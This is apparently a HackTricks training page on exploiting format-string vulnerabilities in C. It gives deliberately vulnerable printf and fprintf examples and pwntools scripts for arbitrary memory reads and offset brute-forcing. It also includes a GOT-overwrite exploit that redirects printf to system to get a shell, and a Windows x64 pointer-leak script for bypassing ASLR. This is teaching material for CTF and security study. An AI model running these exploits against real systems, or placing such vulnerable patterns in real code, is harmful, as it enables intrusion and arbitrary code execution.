_body: "# Format Strings\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Basic Information\n\nIn C **`printf`**\
  \ is a function that can be used to **print** some string. The **first parameter** this function expects is the **raw text\
  \ with the formatters**. The **following parameters** expected are the **values** to **substitute** the **formatters** from\
  \ the raw text.\n\nOther vulnerable functions are **`sprintf()`** and **`fprintf()`**.\n\nThe vulnerability appears when\
  \ an **attacker text is used as the first argument** to this function. The attacker will be able to craft a **special input\
  \ abusing** the **printf format** string capabilities to read and **write any data in any address (readable/writable)**.\
  \ Being able this way to **execute arbitrary code**.\n\n#### Formatters:\n\n```bash\n%08x —> 8 hex bytes\n%d —> Entire\n\
  %u —> Unsigned\n%s —> String\n%p —> Pointer\n%n —> Number of written bytes\n%hn —> Occupies 2 bytes instead of 4\n<n>$X\
  \ —> Direct access, Example: (\"%3$d\", var1, var2, var3) —> Access to var3\n```\n\n**Examples:**\n\n- Vulnerable example:\n\
  \n```c\nchar buffer[30];\ngets(buffer);  // Dangerous: takes user input without restrictions.\nprintf(buffer);  // If buffer\
  \ contains \"%x\", it reads from the stack.\n```\n\n- Normal Use:\n\n```c\nint value = 1205;\nprintf(\"%x %x %x\", value,\
  \ value, value);  // Outputs: 4b5 4b5 4b5\n```\n\n- With Missing Arguments:\n\n```c\nprintf(\"%x %x %x\", value);  // Unexpected\
  \ output: reads random values from the stack.\n```\n\n- fprintf vulnerable:\n\n```c\n#include <stdio.h>\n\nint main(int\
  \ argc, char *argv[]) {\n    char *user_input;\n    user_input = argv[1];\n    FILE *output_file = fopen(\"output.txt\"\
  , \"w\");\n    fprintf(output_file, user_input); // The user input can include formatters!\n    fclose(output_file);\n \
  \   return 0;\n}\n```\n\n### **Accessing Pointers**\n\nThe format **`%<n>$x`**, where `n` is a number, allows to indicate\
  \ to printf to select the n parameter (from the stack). So if you want to read the 4th param from the stack using printf\
  \ you could do:\n\n```c\nprintf(\"%x %x %x %x\")\n```\n\nand you would read from the first to the forth param.\n\nOr you\
  \ could do:\n\n```c\nprintf(\"%4$x\")\n```\n\nand read directly the forth.\n\nNotice that the attacker controls the `printf`\
  \ **parameter, which basically means that** his input is going to be in the stack when `printf` is called, which means that\
  \ he could write specific memory addresses in the stack.\n\n> [!CAUTION]\n> An attacker controlling this input, will be\
  \ able to **add arbitrary address in the stack and make `printf` access them**. In the next section it will be explained\
  \ how to use this behaviour.\n\n## **Arbitrary Read**\n\nIt's possible to use the formatter **`%n$s`** to make **`printf`**\
  \ get the **address** situated in the **n position**, following it and **print it as if it was a string** (print until a\
  \ 0x00 is found). So if the base address of the binary is **`0x8048000`**, and we know that the user input starts in the\
  \ 4th position in the stack, it's possible to print the starting of the binary with:\n\n```python\nfrom pwn import *\n\n\
  p = process('./bin')\n\npayload = b'%6$s' #4th param\npayload += b'xxxx' #5th param (needed to fill 8bytes with the initial\
  \ input)\npayload += p32(0x8048000) #6th param\n\np.sendline(payload)\nlog.info(p.clean()) # b'\\x7fELF\\x01\\x01\\x01||||'\n\
  ```\n\n> [!CAUTION]\n> Note that you cannot put the address 0x8048000 at the beginning of the input because the string will\
  \ be cat in 0x00 at the end of that address.\n\n### Find offset\n\nTo find the offset to your input you could send 4 or\
  \ 8 bytes (`0x41414141`) followed by **`%1$x`** and **increase** the value till retrieve the `A's`.\n\n<details>\n\n<summary>Brute\
  \ Force printf offset</summary>\n\n```python\n# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak\n\
  \nfrom pwn import *\n\n# Iterate over a range of integers\nfor i in range(10):\n    # Construct a payload that includes\
  \ the current integer as offset\n    payload = f\"AAAA%{i}$x\".encode()\n\n    # Start a new process of the \"chall\" binary\n\
  \    p = process(\"./chall\")\n\n    # Send the payload to the process\n    p.sendline(payload)\n\n    # Read and store\
  \ the output of the process\n    output = p.clean()\n\n    # Check if the string \"41414141\" (hexadecimal representation\
  \ of \"AAAA\") is in the output\n    if b\"41414141\" in output:\n        # If the string is found, log the success message\
  \ and break out of the loop\n        log.success(f\"User input is at offset : {i}\")\n        break\n\n    # Close the process\n\
  \    p.close()\n```\n\n</details>\n\n### How useful\n\nArbitrary reads can be useful to:\n\n- **Dump** the **binary** from\
  \ memory\n- **Access specific parts of memory where sensitive** **info** is stored (like canaries, encryption keys or custom\
  \ passwords like in this [**CTF challenge**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))\n\
  \n## **Arbitrary Write**\n\nThe formatter **`%<num>$n`** **writes** the **number of written bytes** in the **indicated address**\
  \ in the <num> param in the stack. If an attacker can write as many char as he will with printf, he is going to be able\
  \ to make **`%<num>$n`** write an arbitrary number in an arbitrary address.\n\nFortunately, to write the number 9999, it's\
  \ not needed to add 9999 \"A\"s to the input, in order to so so it's possible to use the formatter **`%.<num-write>%<num>$n`**\
  \ to write the number **`<num-write>`** in the **address pointed by the `num` position**.\n\n```bash\nAAAA%.6000d%4\\$n\
  \ —> Write 6004 in the address indicated by the 4º param\nAAAA.%500\\$08x —> Param at offset 500\n```\n\nHowever, note that\
  \ usually in order to write an address such as `0x08049724` (which is a HUGE number to write at once), **it's used `$hn`**\
  \ instead of `$n`. This allows to **only write 2 Bytes**. Therefore this operation is done twice, one for the highest 2B\
  \ of the address and another time for the lowest ones.\n\nTherefore, this vulnerability allows to **write anything in any\
  \ address (arbitrary write).**\n\nIn this example, the goal is going to be to **overwrite** the **address** of a **function**\
  \ in the **GOT** table that is going to be called later. Although this could abuse other arbitrary write to exec techniques:\n\
  \n\n{{#ref}}\n../arbitrary-write-2-exec/\n{{#endref}}\n\nWe are going to **overwrite** a **function** that **receives**\
  \ its **arguments** from the **user** and **point** it to the **`system`** **function**.\\\nAs mentioned, to write the address,\
  \ usually 2 steps are needed: You **first writes 2Bytes** of the address and then the other 2. To do so **`$hn`** is used.\n\
  \n- **HOB** is called to the 2 higher bytes of the address\n- **LOB** is called to the 2 lower bytes of the address\n\n\
  Then, because of how format string works you need to **write first the smallest** of \\[HOB, LOB] and then the other one.\n\
  \nIf HOB < LOB\\\n`[address+2][address]%.[HOB-8]x%[offset]\\$hn%.[LOB-HOB]x%[offset+1]`\n\nIf HOB > LOB\\\n`[address+2][address]%.[LOB-8]x%[offset+1]\\\
  $hn%.[HOB-LOB]x%[offset]`\n\nHOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB\n\n```bash\npython\
  \ -c 'print \"\\x26\\x97\\x04\\x08\"+\"\\x24\\x97\\x04\\x08\"+ \"%.49143x\" + \"%4$hn\" + \"%.15408x\" + \"%5$hn\"'\n```\n\
  \n### Pwntools Template\n\nYou can find a **template** to prepare a exploit for this kind of vulnerability in:\n\n\n{{#ref}}\n\
  format-strings-template.md\n{{#endref}}\n\nOr this basic example from [**here**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):\n\
  \n```python\nfrom pwn import *\n\nelf = context.binary = ELF('./got_overwrite-32')\nlibc = elf.libc\nlibc.address = 0xf7dc2000\
  \       # ASLR disabled\n\np = process()\n\npayload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})\np.sendline(payload)\n\
  \np.clean()\n\np.sendline('/bin/sh')\n\np.interactive()\n```\n\n## Format Strings to BOF\n\nIt's possible to abuse the write\
  \ actions of a format string vulnerability to **write in addresses of the stack** and exploit a **buffer overflow** type\
  \ of vulnerability.\n\n\n## Windows x64: Format-string leak to bypass ASLR (no varargs)\n\nOn Windows x64 the first four\
  \ integer/pointer parameters are passed in registers: RCX, RDX, R8, R9. In many buggy call-sites the attacker-controlled\
  \ string is used as the format argument but no variadic arguments are provided, for example:\n\n```c\n// keyData is fully\
  \ controlled by the client\n// _snprintf(dst, len, fmt, ...)\n_snprintf(keyStringBuffer, 0xff2, (char*)keyData);\n```\n\n\
  Because no varargs are passed, any conversion like \"%p\", \"%x\", \"%s\" will cause the CRT to read the next variadic argument\
  \ from the appropriate register. With the Microsoft x64 calling convention the first such read for \"%p\" comes from R9.\
  \ Whatever transient value is in R9 at the call-site will be printed. In practice this often leaks a stable in-module pointer\
  \ (e.g., a pointer to a local/global object previously placed in R9 by surrounding code or a callee-saved value), which\
  \ can be used to recover the module base and defeat ASLR.\n\nPractical workflow:\n\n- Inject a harmless format such as \"\
  %p \" at the very start of the attacker-controlled string so the first conversion executes before any filtering.\n- Capture\
  \ the leaked pointer, identify the static offset of that object inside the module (by reversing once with symbols or a local\
  \ copy), and recover the image base as `leak - known_offset`.\n- Reuse that base to compute absolute addresses for ROP gadgets\
  \ and IAT entries remotely.\n\nExample (abbreviated python):\n\n```python\nfrom pwn import remote\n\n# Send an input that\
  \ the vulnerable code will pass as the \"format\"\nfmt = b\"%p \" + b\"-AAAAA-BBB-CCCC-0252-\"  # leading %p leaks R9\n\
  io = remote(HOST, 4141)\n# ... drive protocol to reach the vulnerable snprintf ...\nleaked = int(io.recvline().split()[2],\
  \ 16)   # e.g. 0x7ff6693d0660\nbase   = leaked - 0x20660                     # module base = leak - offset\nprint(hex(leaked),\
  \ hex(base))\n```\n\nNotes:\n- The exact offset to subtract is found once during local reversing and then reused (same binary/version).\n\
  - If \"%p\" doesn’t print a valid pointer on the first try, try other specifiers (\"%llx\", \"%s\") or multiple conversions\
  \ (\"%p %p %p\") to sample other argument registers/stack.\n- This pattern is specific to the Windows x64 calling convention\
  \ and printf-family implementations that fetch nonexistent varargs from registers when the format string requests them.\n\
  \nThis technique is extremely useful to bootstrap ROP on Windows services compiled with ASLR and no obvious memory disclosure\
  \ primitives.\n\n## Other Examples & References\n\n- [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)\n\
